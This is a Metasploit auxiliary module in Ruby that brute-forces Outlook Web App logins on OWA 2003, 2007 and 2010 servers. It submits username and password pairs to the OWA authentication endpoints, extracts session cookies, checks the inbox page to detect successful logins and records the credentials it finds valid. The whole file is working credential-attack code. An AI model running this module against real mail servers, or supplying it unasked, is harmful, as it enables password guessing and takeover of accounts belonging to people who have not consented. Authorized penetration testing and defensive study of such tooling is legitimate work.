##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Exploit::Remote::HttpClient

	def initialize
		super(
			'Name'           => 'Outlook Web App (OWA) Brute Force Utility',
			'Description'    => %q{
				This module tests credentials on OWA 2003, 2007 and 2010 servers. The default
				action is set to OWA 2010.
			},
			'Author'         =>
				[
					'Vitor Moreira',
					'Spencer McIntyre',
					'SecureState R&D Team',
					'sinn3r'
				],
			'License'        => MSF_LICENSE,
			'Actions'        =>
				[
					[
						'OWA 2003',
						{
							'Description' => 'OWA version 2003',
							'AuthPath'    => '/exchweb/bin/auth/owaauth.dll',
							'InboxPath'   => '/exchange/',
							'InboxCheck'  => /Inbox/
						}
					],
					[
						'OWA 2007',
						{
							'Description' => 'OWA version 2007',
							'AuthPath'    => '/owa/auth/owaauth.dll',
							'InboxPath'   => '/owa/',
							'InboxCheck'  => /addrbook.gif/
						}
					],
					[
						'OWA 2010',
						{
							'Description' => 'OWA version 2010',
							'AuthPath'    => '/owa/auth.owa',
							'InboxPath'   => '/owa/',
							'InboxCheck'  => /Inbox|location(\x20*)=(\x20*)"\\\/(\w+)\\\/logoff\.owa|A mailbox couldn\'t be found|\<a .+onclick="return JumpTo\('logoff\.aspx.+\">/
						}
					]
				],
			'DefaultAction' => 'OWA 2010'
		)

		register_options(
			[
				OptInt.new('RPORT', [ true, "The target port", 443]),
			], self.class)

		register_advanced_options(
			[
				OptString.new('AD_DOMAIN', [ false, "Optional AD domain to prepend to usernames", '']),
				OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true])
			], self.class)

		deregister_options('BLANK_PASSWORDS')
	end

	def cleanup
		# Restore the original settings
		datastore['BLANK_PASSWORDS'] = @blank_passwords_setting
		datastore['USER_AS_PASS']    = @user_as_pass_setting
	end

	def run
		# Store the original setting
		@blank_passwords_setting = datastore['BLANK_PASSWORDS']

		# OWA doesn't support blank passwords
		datastore['BLANK_PASSWORDS'] = false

		# If there's a pre-defined username/password, we need to turn off USER_AS_PASS
		# so that the module won't just try username:username, and then exit.
		@user_as_pass_setting = datastore['USER_AS_PASS']
		if not datastore['USERNAME'].nil? and not datastore['PASSWORD'].nil?
			print_status("Disabling 'USER_AS_PASS' because you've specified an username/password")
			datastore['USER_AS_PASS'] = false
		end

		vhost = datastore['VHOST'] || datastore['RHOST']

		print_status("#{msg} Testing version #{action.name}")

		# Here's a weird hack to check if each_user_pass is empty or not
		# apparently you cannot do each_user_pass.empty? or even inspect() it
		isempty = true
		each_user_pass do |user|
			isempty = false
			break
		end
		print_error("No username/password specified") if isempty

		auth_path   = action.opts['AuthPath']
		inbox_path  = action.opts['InboxPath']
		login_check = action.opts['InboxCheck']

		begin
			each_user_pass do |user, pass|
				vprint_status("#{msg} Trying #{user} : #{pass}")
				try_user_pass(user, pass, auth_path, inbox_path, login_check, vhost)
			end
		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
			print_error("#{msg} HTTP Connection Error, Aborting")
		end
	end

	def try_user_pass(user, pass, auth_path, inbox_path, login_check, vhost)
		user = datastore['AD_DOMAIN'] + '\\' + user if datastore['AD_DOMAIN'] != ''
		headers = {
			'Cookie' => 'PBack=0'
		}

		if (datastore['SSL'].to_s.match(/^(t|y|1)/i))
			data = 'destination=https://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass
		else
			data = 'destination=http://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass
		end

		begin
			res = send_request_cgi({
				'encode'   => true,
				'uri'      => auth_path,
				'method'   => 'POST',
				'headers'  => headers,
				'data'     => data
			}, 25)

		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
			print_error("#{msg} HTTP Connection Failed, Aborting")
			return :abort
		end

		if not res
			print_error("#{msg} HTTP Connection Error, Aborting")
			return :abort
		end

		if not res.headers['set-cookie']
			print_error("#{msg} Received invalid repsonse due to a missing cookie (possibly due to invalid version), aborting")
			return :abort
		end

		# these two lines are the authentication info
		sessionid = 'sessionid=' << res.headers['set-cookie'].split('sessionid=')[1].split('; ')[0]
		cadata = 'cadata=' << res.headers['set-cookie'].split('cadata=')[1].split('; ')[0]

		headers['Cookie'] = 'PBack=0; ' << sessionid << '; ' << cadata

		begin
			res = send_request_cgi({
				'uri'       => inbox_path,
				'method'    => 'GET',
				'headers'   => headers
			}, 20)
		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
			print_error("#{msg} HTTP Connection Failed, Aborting")
			return :abort
		end

		if not res
			print_error("#{msg} HTTP Connection Error, Aborting")
			return :abort
		end

		if res.code == 302
			vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
			return :skip_pass
		end

		if res.body =~ login_check
			print_good("#{msg} SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")

			report_hash = {
				:host   => datastore['RHOST'],
				:port   => datastore['RPORT'],
				:sname  => 'owa',
				:user   => user,
				:pass   => pass,
				:active => true,
				:type => 'password'}

			report_auth_info(report_hash)
			return :next_user
		else
			vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
			return :skip_pass
		end
	end

	def msg
		"#{vhost}:#{rport} OWA -"
	end

end
